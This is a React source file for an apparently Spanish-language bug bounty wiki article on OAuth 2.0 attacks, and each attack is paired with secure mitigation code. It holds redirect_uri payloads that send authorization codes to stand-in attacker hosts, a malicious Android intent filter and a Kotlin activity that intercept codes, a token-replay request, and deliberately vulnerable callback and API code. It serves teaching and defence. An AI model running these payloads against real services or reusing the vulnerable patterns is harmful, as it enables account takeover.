/**
 * OAUTH ATTACKS
 * Explotar flujos OAuth mal implementados
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Key, Lock, Shield, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function OAuthAttacksContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="OAuth 2.0 - El Protocolo Más Malinterpretado">
        <Paragraph>
          Imagina que quieres usar una aplicación web que te permite "Iniciar sesión con Google". 
          En lugar de crear una nueva cuenta y contraseña, simplemente haces clic en un botón y 
          Google le dice a la aplicación: <em>"Sí, conozco a este usuario y autorizo que accedas 
          a su email y nombre"</em>.
        </Paragraph>

        <Paragraph>
          Esto es <Strong>OAuth 2.0</Strong>: un sistema de <Strong>delegación de autorización</Strong>. 
          No estás compartiendo tu contraseña de Google con la aplicación, sino que Google actúa como 
          intermediario de confianza.
        </Paragraph>

        <AlertInfo title="¿Por qué se usa OAuth?">
          <ul className="mt-2 space-y-2">
            <ListItem><Strong>No expones contraseñas:</Strong> La app nunca ve tu contraseña de Google</ListItem>
            <ListItem><Strong>Acceso limitado:</Strong> Solo das los permisos necesarios (email, perfil, etc.)</ListItem>
            <ListItem><Strong>Revocable:</Strong> Puedes quitar el acceso cuando quieras desde tu cuenta de Google</ListItem>
          </ul>
        </AlertInfo>

        <Subsection title="¿Qué puede salir mal?">
          <Paragraph>
            Aunque OAuth es seguro en teoría, las <Strong>implementaciones incorrectas</Strong> son 
            extremadamente comunes y pueden causar:
          </Paragraph>

          <HighlightBox>
            <ul className="space-y-2">
              <ListItem>🔓 <Strong>Account Takeover:</Strong> Atacante toma control total de tu cuenta</ListItem>
              <ListItem>📧 <Strong>Robo de datos personales:</Strong> Email, nombre, foto de perfil expuestos</ListItem>
              <ListItem>🎭 <Strong>Suplantación de identidad:</Strong> Atacante se hace pasar por ti</ListItem>
              <ListItem>💳 <Strong>Acceso a recursos privados:</Strong> Tus documentos, fotos, contactos comprometidos</ListItem>
            </ul>
          </HighlightBox>
        </Subsection>

        <AlertWarning title="Vulnerabilidades más comunes que aprenderás">
          <ol className="mt-2 space-y-2 list-decimal list-inside">
            <ListItem><Strong>Redirect URI Manipulation:</Strong> Redirigir el código de autorización a un sitio del atacante</ListItem>
            <ListItem><Strong>CSRF en OAuth:</Strong> Vincular la cuenta del atacante a tu sesión</ListItem>
            <ListItem><Strong>Code Interception:</Strong> Interceptar códigos en apps móviles sin protección</ListItem>
            <ListItem><Strong>Email Hijacking:</Strong> Cambiar el email verificado para tomar la cuenta</ListItem>
            <ListItem><Strong>Token Replay:</Strong> Reutilizar tokens en servicios no autorizados</ListItem>
          </ol>
        </AlertWarning>
      </Section>

      <Section id="flujo-oauth" title="1. Entendiendo el Flujo OAuth (Sin Tecnicismos)">
        <Paragraph>
          Antes de ver los ataques, necesitas entender cómo funciona OAuth en la vida real. 
          Usemos una analogía simple:
        </Paragraph>

        <HighlightBox>
          <Paragraph>
            <Strong>Analogía del Hotel 🏨</Strong>
          </Paragraph>
          <ul className="mt-3 space-y-2">
            <ListItem><Strong>Tú</Strong> = El huésped (usuario)</ListItem>
            <ListItem><Strong>Hotel</Strong> = Google/Facebook (proveedor OAuth)</ListItem>
            <ListItem><Strong>Servicio de Limpieza</Strong> = Aplicación que quiere acceder a tu habitación</ListItem>
            <ListItem><Strong>Tarjeta de acceso temporal</Strong> = Access Token</ListItem>
          </ul>
          <Paragraph className="mt-3">
            El servicio de limpieza no necesita tu llave maestra (contraseña). En su lugar, 
            el hotel te da una <em>tarjeta temporal</em> que solo abre tu habitación y solo 
            funciona durante unas horas. Cuando termina el servicio, la tarjeta deja de funcionar.
          </Paragraph>
        </HighlightBox>

        <Subsection title="Flujo OAuth Paso a Paso (Versión Simple)">
          <AlertInfo title="Paso 1: Usuario hace clic en 'Login with Google'">
            <Paragraph className="mt-2">
              La aplicación te redirige a Google diciendo: <em>"Hola Google, necesito acceso 
              al email y nombre de este usuario. ¿Me das permiso?"</em>
            </Paragraph>
          </AlertInfo>

          <AlertInfo title="Paso 2: Google te pregunta si estás de acuerdo">
            <Paragraph className="mt-2">
              Ves una pantalla como: <em>"¿Permitir que MyApp acceda a tu email y perfil?"</em> 
              con botones Permitir/Cancelar.
            </Paragraph>
          </AlertInfo>

          <AlertInfo title="Paso 3: Si aceptas, Google genera un código temporal">
            <Paragraph className="mt-2">
              Google te redirige de vuelta a la aplicación con un <InlineCode>code</InlineCode> 
              especial en la URL. Este código solo funciona <Strong>una vez</Strong> y expira 
              en <Strong>10 minutos</Strong>.
            </Paragraph>
          </AlertInfo>

          <AlertInfo title="Paso 4: La aplicación intercambia el código por un token">
            <Paragraph className="mt-2">
              La aplicación le dice a Google en secreto: <em>"Dame el token real, aquí está mi 
              código temporal"</em>. Google verifica que el código sea válido y devuelve el 
              <InlineCode>access_token</InlineCode>.
            </Paragraph>
          </AlertInfo>

          <AlertInfo title="Paso 5: La aplicación usa el token para obtener tus datos">
            <Paragraph className="mt-2">
              Ahora la aplicación puede preguntar a Google: <em>"¿Cuál es el email de este usuario?"</em> 
              y Google responde con tu información.
            </Paragraph>
          </AlertInfo>
        </Subsection>

        <AlertTip title="Datos Técnicos Clave (Para Bug Bounty)">
          <ul className="mt-2 space-y-2">
            <ListItem><InlineCode>client_id</InlineCode>: Identificador público de la app (como un nombre de usuario)</ListItem>
            <ListItem><InlineCode>client_secret</InlineCode>: Contraseña secreta de la app (NO debe filtrarse)</ListItem>
            <ListItem><InlineCode>redirect_uri</InlineCode>: URL donde Google devuelve el código (objetivo principal de ataques)</ListItem>
            <ListItem><InlineCode>state</InlineCode>: Token anti-CSRF para validar que el flujo no fue manipulado</ListItem>
            <ListItem><InlineCode>scope</InlineCode>: Permisos solicitados (email, perfil, archivos de Drive, etc.)</ListItem>
          </ul>
        </AlertTip>
      </Section>

      <Section id="redirect-uri-manipulation" title="2. Ataque: Redirect URI Manipulation (Robo de Código)">
        <Subsection title="¿Qué es este ataque?">
          <Paragraph>
            Recuerda que cuando autorizas una app, Google te redirige de vuelta a ella con el 
            código temporal en la URL. ¿Pero qué pasa si un atacante puede <Strong>cambiar esa URL</Strong> 
            para que el código se envíe a <em>su servidor</em> en lugar del legítimo?
          </Paragraph>

          <HighlightBox>
            <Paragraph className="text-lg">
              💡 <Strong>Analogía:</Strong> Es como si un ladrón modificara la dirección de entrega 
              de tu paquete mientras está en tránsito. El paquete (código OAuth) termina en su casa, 
              no en la tuya.
            </Paragraph>
          </HighlightBox>
        </Subsection>

        <Subsection title="¿Cómo funciona el ataque?">
          <AlertWarning title="Paso 1: Atacante manipula el redirect_uri">
            <Paragraph className="mt-2">
              La URL normal de autorización es:
            </Paragraph>
            <CodeBlock
              language="text"
              code={`https://google.com/oauth/authorize?
  client_id=abc123
  &redirect_uri=https://legitapp.com/callback  ✅ Legítima
  &response_type=code`}
            />
            <Paragraph className="mt-2">
              El atacante la modifica a:
            </Paragraph>
            <CodeBlock
              language="text"
              code={`https://google.com/oauth/authorize?
  client_id=abc123
  &redirect_uri=https://attacker.com/steal  ❌ Maliciosa
  &response_type=code`}
            />
          </AlertWarning>

          <AlertDanger title="Paso 2: Víctima autoriza sin darse cuenta">
            <Paragraph className="mt-2">
              La víctima ve la pantalla normal de Google preguntando: <em>"¿Permitir acceso a MyApp?"</em> 
              Todo se ve legítimo porque la pantalla es real de Google. Hace clic en <Strong>Permitir</Strong>.
            </Paragraph>
          </AlertDanger>

          <AlertDanger title="Paso 3: Código se envía al servidor del atacante">
            <Paragraph className="mt-2">
              Google redirige a la URL maliciosa:
            </Paragraph>
            <CodeBlock
              language="text"
              code={`https://attacker.com/steal?code=CODIGO_SECRETO_AQUI`}
            />
            <Paragraph className="mt-2">
              El atacante ahora tiene el código. Puede intercambiarlo por el token de acceso y 
              <Strong>tomar control de la cuenta de la víctima</Strong>.
            </Paragraph>
          </AlertDanger>
        </Subsection>

        <Subsection title="¿Por qué funciona este ataque?">
          <Paragraph>
            Muchos desarrolladores validan el <InlineCode>redirect_uri</InlineCode> incorrectamente. 
            En lugar de hacer una comparación exacta, usan lógica débil como:
          </Paragraph>

          <HighlightBox>
            <ul className="space-y-3">
              <ListItem>
                ❌ <Strong>Validación por substring:</Strong> Solo verifican que la URL <em>"contenga"</em> 
                el dominio legítimo.
                <CodeBlock
                  language="text"
                  code={`Payload: redirect_uri=https://legitapp.com.evil.com
La validación ve "legitapp.com" y la acepta ✅ (PERO ES FALSA)`}
                />
              </ListItem>
              <ListItem>
                ❌ <Strong>Sin validación del path:</Strong> Aceptan cualquier path del dominio.
                <CodeBlock
                  language="text"
                  code={`Si legitapp.com tiene un open redirect:
redirect_uri=https://legitapp.com/redirect?url=https://attacker.com`}
                />
              </ListItem>
              <ListItem>
                ❌ <Strong>Subdominios no validados:</Strong> Aceptan cualquier subdominio.
                <CodeBlock
                  language="text"
                  code={`redirect_uri=https://attacker.legitapp.com  (si controlas el subdominio)`}
                />
              </ListItem>
            </ul>
          </HighlightBox>
        </Subsection>

        <Subsection title="¿Cómo detectar esta vulnerabilidad en Bug Bounty?">
          <AlertTip title="Checklist de pruebas">
            <ol className="mt-2 space-y-2 list-decimal list-inside">
              <ListItem>Inicia el flujo OAuth y captura la URL de autorización en Burp Suite</ListItem>
              <ListItem>Modifica el parámetro <InlineCode>redirect_uri</InlineCode> a:
                <ul className="ml-6 mt-2 space-y-1 list-disc">
                  <ListItem><InlineCode>https://yourserver.com</InlineCode></ListItem>
                  <ListItem><InlineCode>https://legitapp.com.evil.com</InlineCode></ListItem>
                  <ListItem><InlineCode>https://legitapp.com@attacker.com</InlineCode></ListItem>
                  <ListItem><InlineCode>https://legitapp.com/callback?next=https://attacker.com</InlineCode></ListItem>
                </ul>
              </ListItem>
              <ListItem>Si el proveedor acepta la URL modificada y te redirige ahí con el código → <Strong>VULNERABLE</Strong></ListItem>
            </ol>
          </AlertTip>
        </Subsection>

        <Subsection title="Mitigación (Cómo debe implementarse correctamente)">
          <CodeBlock
            language="javascript"
            title="✅ Validación segura de redirect_uri"
            code={`// Lista blanca exacta de URIs permitidas
const ALLOWED_REDIRECTS = [
  'https://legitapp.com/callback',
  'https://legitapp.com/oauth/callback'
];

app.get('/oauth/authorize', (req, res) => {
  const { redirect_uri } = req.query;
  
  // Comparación EXACTA (no substring)
  if (!ALLOWED_REDIRECTS.includes(redirect_uri)) {
    return res.status(400).json({ 
      error: 'invalid_redirect_uri',
      message: 'Redirect URI no autorizada'
    });
  }
  
  // Continuar flujo OAuth...
});`}
          />
        </Subsection>
      </Section>

      <Section id="csrf-oauth" title="3. Ataque: CSRF en OAuth Flow (Account Linking Attack)">
        <Subsection title="¿Qué es este ataque?">
          <Paragraph>
            Este es uno de los ataques OAuth más peligrosos y menos conocidos. El atacante logra 
            <Strong>vincular su propia cuenta de Google/Facebook</Strong> a tu cuenta en la aplicación 
            víctima. Cuando inicies sesión con OAuth, ¡estarás usando la cuenta del atacante!
          </Paragraph>

          <HighlightBox>
            <Paragraph className="text-lg">
              💡 <Strong>Analogía:</Strong> Es como si un ladrón lograra asociar su tarjeta bancaria 
              con tu cuenta de Netflix. Cuando pagas la suscripción, se cobra a su tarjeta, pero él 
              tiene acceso total a tu perfil, historial y configuración.
            </Paragraph>
          </HighlightBox>
        </Subsection>

        <Subsection title="¿Cómo funciona el ataque?">
          <AlertWarning title="Paso 1: Atacante prepara la trampa">
            <Paragraph className="mt-2">
              El atacante inicia un flujo OAuth normal con <Strong>su propia cuenta de Google</Strong>. 
              Pero en lugar de completarlo, captura la URL del callback que contiene el código de autorización.
            </Paragraph>
            <CodeBlock
              language="text"
              code={`URL que el atacante intercepta:
https://vulnerable-app.com/oauth/callback?code=CODIGO_DEL_ATACANTE`}
            />
          </AlertWarning>

          <AlertDanger title="Paso 2: Víctima hace clic en el enlace malicioso">
            <Paragraph className="mt-2">
              El atacante envía esta URL a la víctima por email, redes sociales o la inserta en un 
              sitio web. La víctima hace clic mientras está logueada en la aplicación vulnerable.
            </Paragraph>
          </AlertDanger>

          <AlertDanger title="Paso 3: Cuenta del atacante se vincula a la víctima">
            <Paragraph className="mt-2">
              Cuando la víctima visita la URL, la aplicación procesa el código OAuth <Strong>sin validar</Strong> 
              que el flujo lo inició la misma persona. Resultado:
            </Paragraph>
            <ul className="mt-2 space-y-1">
              <ListItem>✅ Cuenta de Google del <Strong>atacante</Strong> se asocia al perfil de la <Strong>víctima</Strong></ListItem>
              <ListItem>🚨 Ahora el atacante puede iniciar sesión en la cuenta de la víctima usando OAuth</ListItem>
              <ListItem>💀 La víctima no se da cuenta hasta que es tarde</ListItem>
            </ul>
          </AlertDanger>
        </Subsection>

        <Subsection title="¿Por qué funciona?">
          <Paragraph>
            El flujo OAuth tiene un parámetro llamado <InlineCode>state</InlineCode> que está diseñado 
            <Strong>específicamente para prevenir este ataque</Strong>. El problema es que muchos 
            desarrolladores:
          </Paragraph>

          <HighlightBox>
            <ul className="space-y-2">
              <ListItem>❌ No envían el parámetro <InlineCode>state</InlineCode></ListItem>
              <ListItem>❌ Lo envían pero no lo validan en el callback</ListItem>
              <ListItem>❌ Usan un valor estático en lugar de uno aleatorio por sesión</ListItem>
              <ListItem>❌ No vinculan el <InlineCode>state</InlineCode> con la sesión del usuario</ListItem>
            </ul>
          </HighlightBox>
        </Subsection>

        <Subsection title="¿Cómo detectar esta vulnerabilidad?">
          <AlertTip title="Prueba manual en Bug Bounty">
            <ol className="mt-2 space-y-2 list-decimal list-inside">
              <ListItem>Inicia sesión en la app vulnerable con tu cuenta (Usuario A)</ListItem>
              <ListItem>Haz clic en "Conectar con Google" y captura la URL del callback en Burp Suite</ListItem>
              <ListItem>Guarda esa URL (contiene el código OAuth)</ListItem>
              <ListItem>Abre un navegador en modo incógnito e inicia sesión con otra cuenta (Usuario B)</ListItem>
              <ListItem>Pega la URL del paso 3 en el navegador incógnito</ListItem>
              <ListItem>Si la cuenta de Google del Usuario A se vincula al Usuario B → <Strong>VULNERABLE A CSRF</Strong></ListItem>
            </ol>
          </AlertTip>

          <Paragraph>
            También puedes verificar si el parámetro <InlineCode>state</InlineCode> está presente y 
            si eliminarlo o modificarlo causa error. Si la app acepta cualquier valor → vulnerable.
          </Paragraph>
        </Subsection>

        <Subsection title="Mitigación correcta">
          <CodeBlock
            language="javascript"
            title="✅ Implementación segura con validación de state"
            code={`// Al iniciar el flujo OAuth
app.get('/oauth/start', (req, res) => {
  // Generar token anti-CSRF aleatorio
  const state = crypto.randomBytes(32).toString('hex');
  
  // Guardar en sesión del usuario
  req.session.oauthState = state;
  
  // Incluir en URL de autorización
  const authUrl = \`https://google.com/oauth/authorize?
    client_id=\${CLIENT_ID}
    &redirect_uri=\${REDIRECT_URI}
    &response_type=code
    &scope=email profile
    &state=\${state}\`;  // 👈 Token único por sesión
  
  res.redirect(authUrl);
});

// En el callback
app.get('/oauth/callback', async (req, res) => {
  const { code, state } = req.query;
  
  // ✅ VALIDAR state contra la sesión
  if (!state || state !== req.session.oauthState) {
    return res.status(403).json({ 
      error: 'invalid_state',
      message: 'Posible ataque CSRF detectado'
    });
  }
  
  // Limpiar el state usado (one-time use)
  delete req.session.oauthState;
  
  // Continuar con el flujo OAuth...
  const tokens = await exchangeCodeForTokens(code);
  // ...
});`}
          />
        </Subsection>
      </Section>

      <Section id="authorization-code-interception" title="4. Authorization Code Interception">
        <CodeBlock
          language="javascript"
          title="❌ Mobile app vulnerable sin PKCE"
          code={`// Mobile app SIN PKCE (Proof Key for Code Exchange)
const initiateOAuth = () => {
  const authUrl = \`https://oauth-provider.com/authorize?
    client_id=mobile-app-123
    &redirect_uri=myapp://callback
    &response_type=code
    &scope=email\`;
  
  // Abrir browser
  openBrowser(authUrl);
};

// ❌ VULNERABLE - Code puede ser interceptado
const handleCallback = async (url) => {
  const code = extractCodeFromUrl(url);
  
  // Intercambiar code por token
  const tokens = await fetch('https://oauth-provider.com/token', {
    method: 'POST',
    body: JSON.stringify({
      client_id: 'mobile-app-123',
      client_secret: '', // ← Mobile apps NO pueden tener secretos seguros
      code: code,
      grant_type: 'authorization_code'
    })
  });
};`}
        />

        <Subsection title="Ataque - Malicious App Intercepts Code">
          <CodeBlock
            language="kotlin"
            title="App maliciosa registra mismo URL scheme"
            code={`// Malicious app AndroidManifest.xml
<activity android:name=".MaliciousActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        
        <!-- Mismo scheme que app legítima -->
        <data android:scheme="myapp" android:host="callback" />
    </intent-filter>
</activity>

// Malicious activity
class MaliciousActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Interceptar authorization code
        val data = intent.data
        val code = data?.getQueryParameter("code")
        
        // Enviar code a servidor del atacante
        sendToAttacker(code)
        
        // Opcionalmente: forward a app legítima
        forwardToLegitimateApp(data)
    }
}`}
          />
        </Subsection>
      </Section>

      <Section id="scope-abuse" title="5. Scope Abuse - Email Hijacking">
        <CodeBlock
          language="javascript"
          title="Flujo vulnerable que confía en email del OAuth"
          code={`// Sign up/Login con OAuth
app.get('/oauth/callback', async (req, res) => {
  const tokens = await exchangeCodeForTokens(req.query.code);
  const userInfo = await getUserInfo(tokens.access_token);
  
  // ❌ VULNERABLE - Confía ciegamente en email del OAuth provider
  let user = await db.users.findOne({ email: userInfo.email });
  
  if (!user) {
    // Crear nueva cuenta automáticamente
    user = await db.users.create({
      email: userInfo.email,
      name: userInfo.name,
      oauthProvider: 'google'
    });
  }
  
  // Login automático
  req.session.userId = user.id;
  res.redirect('/dashboard');
});`}
        />

        <Subsection title="Ataque - Account Takeover via OAuth Email">
          <CodeBlock
            language="text"
            title="Escenario del ataque"
            code={`SETUP:
1. Víctima tiene cuenta: victim@gmail.com
2. Víctima NO ha vinculado OAuth (solo password)

ATAQUE:
1. Atacante crea cuenta en OAuth provider diferente con email: victim@gmail.com
   (En providers que NO verifican email, como algunos OIDC self-hosted)

2. Atacante inicia flujo OAuth en app vulnerable

3. App recibe userInfo.email = "victim@gmail.com"

4. App encuentra cuenta existente de la víctima

5. App hace LOGIN AUTOMÁTICO en cuenta de la víctima

6. ✓ Account Takeover completo sin password`}
          />

          <AlertDanger title="Mitigación">
            <Strong>NUNCA</Strong> confiar automáticamente en el email del OAuth provider. 
            Verificar que el email esté confirmado (<InlineCode>email_verified: true</InlineCode>) 
            y usar <InlineCode>sub</InlineCode> (subject ID) como identificador único.
          </AlertDanger>
        </Subsection>
      </Section>

      <Section id="token-replay" title="6. Token Replay Attacks">
        <CodeBlock
          language="javascript"
          title="❌ API sin validación de audience"
          code={`// API Resource Server vulnerable
app.get('/api/user/profile', async (req, res) => {
  const token = req.headers.authorization?.split('Bearer ')[1];
  
  // ❌ VULNERABLE - Solo valida firma, no audience
  const decoded = jwt.verify(token, PUBLIC_KEY);
  
  const user = await db.users.findById(decoded.sub);
  res.json(user);
});`}
        />

        <Subsection title="Ataque - Cross-Service Token Replay">
          <CodeBlock
            language="text"
            title="Exploit"
            code={`ESCENARIO:
- App A: https://app-a.com (photo sharing)
- App B: https://app-b.com (banking app)
- Ambas usan mismo OAuth provider

ATAQUE:
1. Atacante obtiene access token legítimo de App A
2. Token tiene scope: "email profile"
3. Atacante REUTILIZA token en API de App B
4. App B NO valida que token fue emitido para App B
5. App B acepta token y retorna datos sensibles

TOKEN LEGÍTIMO DE APP A:
{
  "iss": "https://oauth-provider.com",
  "sub": "user123",
  "aud": "app-a-client-id",  ← Debería validarse
  "scope": "email profile",
  "exp": 1735689600
}

REPLAY EN APP B:
GET https://app-b.com/api/account/balance
Authorization: Bearer <token-de-app-a>

# Si App B no valida 'aud', acepta el token ✓`}
          />
        </Subsection>
      </Section>

      <Section id="implicit-flow" title="7. Implicit Flow Vulnerabilities">
        <AlertWarning>
          El <Strong>Implicit Flow</Strong> está <Strong>DEPRECADO</Strong> y NO debe usarse. 
          Sin embargo, muchas apps antiguas aún lo usan.
        </AlertWarning>

        <CodeBlock
          language="text"
          title="Implicit flow - Token en URL fragment"
          code={`# Authorization request
GET https://oauth-provider.com/authorize?
  client_id=abc123
  &redirect_uri=https://client-app.com/callback
  &response_type=token          ← Token directo (NO code)
  &scope=email

# Response - Token en URL FRAGMENT
302 Redirect to:
https://client-app.com/callback#
  access_token=ya29.xxx
  &token_type=Bearer
  &expires_in=3600
  &scope=email

# ❌ PROBLEMAS:
1. Token expuesto en browser history
2. Token en Referer header si se navega a otra página
3. No hay client authentication
4. No hay refresh token
5. Token puede ser interceptado por JavaScript malicioso`}
        />
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Implementación Segura de OAuth">
          Seguir especificaciones RFC y mejores prácticas actualizadas.
        </AlertDanger>

        <Subsection title="1. Validación Estricta de redirect_uri">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Exact match de redirect_uri"
            code={`// Authorization server seguro
app.get('/oauth/authorize', (req, res) => {
  const { client_id, redirect_uri, state } = req.query;
  
  const client = db.clients.findOne({ id: client_id });
  
  // ✅ SEGURO - Exact match (no includes, no regex)
  const allowedUris = client.redirect_uris; // Array de URIs exactas
  
  if (!allowedUris.includes(redirect_uri)) {
    return res.status(400).json({ 
      error: 'invalid_request',
      error_description: 'redirect_uri not registered' 
    });
  }
  
  // ✅ Validar state presente
  if (!state || state.length < 16) {
    return res.status(400).json({ 
      error: 'invalid_request',
      error_description: 'state parameter required' 
    });
  }
  
  // Continuar flujo seguro
  const code = generateAuthCode({ client_id, redirect_uri, state });
  res.redirect(\`\${redirect_uri}?code=\${code}&state=\${state}\`);
});`}
          />
        </Subsection>

        <Subsection title="2. Implementar PKCE (Proof Key for Code Exchange)">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - PKCE para mobile/SPA"
            code={`// CLIENT: Generar PKCE challenge
const generatePKCE = () => {
  // 1. Generar code_verifier (random string)
  const codeVerifier = base64UrlEncode(crypto.randomBytes(32));
  
  // 2. Generar code_challenge (SHA256 hash)
  const codeChallenge = base64UrlEncode(
    crypto.createHash('sha256')
      .update(codeVerifier)
      .digest()
  );
  
  return { codeVerifier, codeChallenge };
};

// CLIENT: Authorization request con PKCE
const { codeVerifier, codeChallenge } = generatePKCE();
localStorage.setItem('pkce_verifier', codeVerifier);

const authUrl = \`https://oauth-provider.com/authorize?
  client_id=mobile-app-123
  &redirect_uri=myapp://callback
  &response_type=code
  &code_challenge=\${codeChallenge}
  &code_challenge_method=S256
  &state=\${state}\`;

// CLIENT: Token exchange con PKCE
const codeVerifier = localStorage.getItem('pkce_verifier');

const tokens = await fetch('https://oauth-provider.com/token', {
  method: 'POST',
  body: JSON.stringify({
    client_id: 'mobile-app-123',
    code: authCode,
    code_verifier: codeVerifier,  // ← PKCE verifier
    grant_type: 'authorization_code',
    redirect_uri: 'myapp://callback'
  })
});

// SERVER: Validar PKCE
app.post('/token', (req, res) => {
  const { code, code_verifier } = req.body;
  
  // Obtener code_challenge guardado al generar el code
  const storedChallenge = db.authCodes.findOne({ code }).code_challenge;
  
  // ✅ Validar que SHA256(verifier) == challenge
  const computedChallenge = base64UrlEncode(
    crypto.createHash('sha256').update(code_verifier).digest()
  );
  
  if (computedChallenge !== storedChallenge) {
    return res.status(400).json({ error: 'invalid_grant' });
  }
  
  // Continuar con token generation
});`}
          />
        </Subsection>

        <Subsection title="3. Validar State Parameter Correctamente">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - State validation con session"
            code={`// CLIENT: Generar y guardar state
app.get('/oauth/login', (req, res) => {
  const state = crypto.randomBytes(16).toString('hex');
  
  // ✅ Guardar en sesión del servidor (NO localStorage)
  req.session.oauthState = state;
  req.session.oauthInitiatedAt = Date.now();
  
  const authUrl = \`https://oauth-provider.com/authorize?
    client_id=abc123
    &redirect_uri=https://client-app.com/callback
    &response_type=code
    &state=\${state}\`;
  
  res.redirect(authUrl);
});

// CLIENT: Validar state en callback
app.get('/oauth/callback', async (req, res) => {
  const { code, state } = req.query;
  
  // ✅ Validar state match
  if (state !== req.session.oauthState) {
    return res.status(403).json({ error: 'State mismatch - CSRF detected' });
  }
  
  // ✅ Validar no expirado (5 minutos max)
  const elapsed = Date.now() - req.session.oauthInitiatedAt;
  if (elapsed > 5 * 60 * 1000) {
    return res.status(403).json({ error: 'OAuth flow expired' });
  }
  
  // ✅ Limpiar state usado
  delete req.session.oauthState;
  delete req.session.oauthInitiatedAt;
  
  // Continuar con code exchange
  const tokens = await exchangeCodeForTokens(code);
  // ...
});`}
          />
        </Subsection>

        <Subsection title="4. Verificar email_verified y Usar sub">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Validación de email verificado"
            code={`app.get('/oauth/callback', async (req, res) => {
  const tokens = await exchangeCodeForTokens(req.query.code);
  const userInfo = await getUserInfo(tokens.access_token);
  
  // ✅ Verificar que email esté verificado
  if (!userInfo.email_verified) {
    return res.status(403).json({ 
      error: 'Email not verified by OAuth provider' 
    });
  }
  
  // ✅ Usar 'sub' (subject ID) como identificador único
  let user = await db.users.findOne({ 
    oauthProvider: 'google',
    oauthSub: userInfo.sub  // ← NO usar email
  });
  
  if (!user) {
    // Primera vez con este OAuth account
    // Verificar si email ya existe en cuenta tradicional
    const existingUser = await db.users.findOne({ 
      email: userInfo.email 
    });
    
    if (existingUser && !existingUser.oauthSub) {
      // Requiere confirmación manual para vincular
      return res.render('link-oauth-account', {
        existingEmail: userInfo.email,
        oauthData: userInfo
      });
    }
    
    // Crear nueva cuenta
    user = await db.users.create({
      email: userInfo.email,
      name: userInfo.name,
      oauthProvider: 'google',
      oauthSub: userInfo.sub,
      emailVerified: true
    });
  }
  
  req.session.userId = user.id;
  res.redirect('/dashboard');
});`}
          />
        </Subsection>

        <Subsection title="5. Validar Audience en Resource Server">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Audience validation"
            code={`// API Resource Server
app.use(async (req, res, next) => {
  const token = req.headers.authorization?.split('Bearer ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  try {
    const decoded = jwt.verify(token, PUBLIC_KEY, {
      algorithms: ['RS256'],
      issuer: 'https://oauth-provider.com',
      audience: 'my-api-client-id'  // ✅ Validar audience
    });
    
    // ✅ Validar scope requerido
    const requiredScope = 'read:profile';
    if (!decoded.scope.includes(requiredScope)) {
      return res.status(403).json({ error: 'Insufficient scope' });
    }
    
    req.user = decoded;
    next();
    
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' });
  }
});`}
          />
        </Subsection>

        <Subsection title="6. Usar Authorization Code Flow (NO Implicit)">
          <AlertTip>
            <Strong>Siempre usar Authorization Code Flow con PKCE.</Strong> El Implicit Flow 
            está deprecado y tiene vulnerabilidades inherentes. Incluso para SPAs, usar 
            Authorization Code + PKCE.
          </AlertTip>
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: SAML Attacks</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/saml-attacks`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Explotar implementaciones SAML inseguras</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
